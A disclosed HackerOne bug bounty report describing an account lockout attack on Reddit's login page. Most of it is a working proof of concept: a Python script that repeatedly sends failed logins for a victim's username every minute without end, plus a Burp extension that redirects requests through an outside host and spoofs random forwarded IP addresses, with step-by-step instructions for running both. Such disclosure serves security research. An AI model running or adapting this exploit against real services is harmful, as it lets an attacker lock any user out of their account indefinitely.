# Misconfigurated login page able to lock login action for any account without user interaction

## Report Details
- **Report ID**: 1582778
- **URL**: https://hackerone.com/reports/1582778
- **State**: Closed
- **Severity**: critical
- **Submitted**: 2022-05-27T10:17:28.931Z
- **Disclosed**: 2022-06-06T23:10:51.121Z

## Reporter
- **Username**: ug0x01
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: reddit

## Vulnerability Information
## Summary
While observing a few things about the login feature, I found that the account was locked after a certain number of requests. Although this feature is actually added to prevent problems such as rate limit, it is open to account lock attacks by attackers.

## PoC
1. Save this code as `exploit.py`:

```
#!/bin/python3

from requests import get, post
from sys import argv
from warnings import filterwarnings
from time import sleep
from concurrent.futures import ThreadPoolExecutor

filterwarnings("ignore")

def get_creds():
    res = get("https://www.reddit.com/login/?experiment_d2x_2020ify_buttons=enabled&experiment_d2x_sso_login_link=enabled&experiment_d2x_google_sso_gis_parity=enabled&experiment_d2x_onboarding=enabled")
    
    csrf_token = res.text.split('name="csrf_token" value="')[1].split('">')[0]
    
    return res.cookies.get_dict(), csrf_token

def lock_account(account, cookie, csrf_token):
    post("https://www.reddit.com/login", cookies=cookie, proxies={"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}, data={"csrf_token": csrf_token, "otp": '', "password": "asdasdasasdasd231321d", "dest": "https://www.reddit.com", "username": account}, headers={"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0", "Accept": "*/*", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Content-Type": "application/x-www-form-urlencoded", "Origin": "https://www.reddit.com", "Sec-Fetch-Dest": "empty", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Site": "same-origin", "Referer": "https://www.reddit.com/login/?experiment_d2x_2020ify_buttons=enabled&experiment_d2x_sso_login_link=enabled&experiment_d2x_google_sso_gis_parity=enabled&experiment_d2x_onboarding=enabled", "Connection": "close"}, verify=False)

cookie, csrf_token = get_creds()
    
for _ in range(14):
    ThreadPoolExecutor(max_workers=15).submit(lock_account, str(argv[1]), cookie, csrf_token)

print("Account Locked!!")
        
sleep(60)
    
while True:
    cookie, csrf_token = get_creds()
    
    for _ in range(14):
        ThreadPoolExecutor(max_workers=15).submit(lock_account, str(argv[1]), cookie, csrf_token)
        
    sleep(60)
```
2. Save this code as `helper.py`:
```
from burp import IBurpExtender
from burp import IHttpListener

import random
import socket
import struct

HOST_FROM = "www.reddit.com"
HOST_TO = "ugroon.link"

class BurpExtender(IBurpExtender, IHttpListener):
    def registerExtenderCallbacks(self, callbacks):
        self._helpers = callbacks.getHelpers()
        
        callbacks.setExtensionName("Traffic redirector")
        callbacks.registerHttpListener(self)

    def processHttpMessage(self, toolFlag, messageIsRequest, messageInfo):
        helpers = self._helpers
        if not messageIsRequest:
            return
        httpService = messageInfo.getHttpService()

        if (HOST_FROM == httpService.getHost()):
            message = helpers.bytesToString(messageInfo.getRequest())
            message = message.replace("Host: " + HOST_FROM, "Host: " + HOST_TO)
            message_array = message.split("\n")
            random_ip = socket.inet_ntoa(struct.pack('>I', random.randint(1, 0xffffffff)))
            message_array.insert(3, "X-My-X-Forwarded-For: " + random_ip)
            message = "\n".join(message_array)
            
            print(message)
            
            message = helpers.stringToBytes(message)
            messageInfo.setHttpService(self._helpers.buildHttpService(HOST_TO,httpService.getPort(),httpService.getProtocol()))

```
3. Download jython 2.7.0 (http://search.maven.org/remotecontent?filepath=org/python/jython-standalone/2.7.0/jython-standalone-2.7.0.jar)
4. Download a burp which is older than 2021 version (new versions giving too many errors)
5. Set jython 2.7.0 with `Extender > Options > Python Environment > Location of Jython standalone JAR file > jython 2.7.0 location`
6. Upload `helper.py` to extensions with `Extender >  Extensions > Burp Extensions > Add > helper.py location`
7. If you use linux, use `chmod +x exploit.py` for set permissions. But if you use windows, directly go to path and do next step
8. Run the exploit with `python3 exploit.py usernameofvictim` and that's all.
9. And for check to exploit work or not, try to login victim account on another device or change IP address and use a different browser for 0 track and you will see it's impossible to login account.

##PoC video

{F1746674}

#Suggested Solutions
To avoid issues like rate limit, use protections like captcha instead of using such protection

##Notes
1. On the login screen it says the account has been locked for 5 minutes. However, the exploit restarts the attack every 5 minutes, so victim can "never" login into the victim account (added for avoid misunderstandings)
2. If you have any questions or what you think is wrong with the report/impact, please mark it as needs more info before closing the report and let me answer your questions.

Cheers,
@h1ugroon

## Impact

Once the attacker starts the attack for the victim account, victim will never be able to login his/her account until the attacker stops the attack.

## Attachments
- recording-1653645412706.webm
